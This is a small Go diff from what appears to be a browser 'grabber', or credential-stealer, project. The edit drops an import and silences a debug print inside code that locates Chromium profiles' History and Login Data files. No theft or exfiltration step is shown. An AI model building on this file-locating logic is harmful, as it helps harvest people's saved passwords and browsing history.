@@ -1,7 +1,6 @@
 package finder
 
 import (
-	"fmt"
 	"kdot/grabber/browsers/chromium/structs"
 	"os"
 	"path/filepath"
@@ -55,7 +54,7 @@ func (f *Finder) findBrowsers() []structs.Browser {
 									profile.History = filepath.Join(path, "History")
 									profile.LoginData = filepath.Join(path, "Login Data")
 
-									fmt.Println(profile)
+									//fmt.Println(profile)
 
 									profiles = append(profiles, profile)
 									return nil
